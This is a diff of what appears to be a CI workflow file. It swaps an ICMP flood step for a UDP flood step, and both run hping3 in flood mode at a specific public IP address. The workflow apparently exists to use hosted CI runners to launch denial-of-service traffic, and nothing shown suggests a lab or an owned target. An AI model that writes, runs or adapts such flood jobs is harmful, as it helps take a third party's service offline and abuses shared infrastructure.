@@ -31,7 +31,7 @@ jobs:
       run: |
         sudo hping3 --help
         
-    - name: ICMP Flood
-      run: sudo hping3 --icmp -d 56 --flood 47.106.20.243
+    - name: UDP Flood
+      run: sudo hping3 -n --udp -d 100 -p 443 --flood 47.106.20.243
         
         
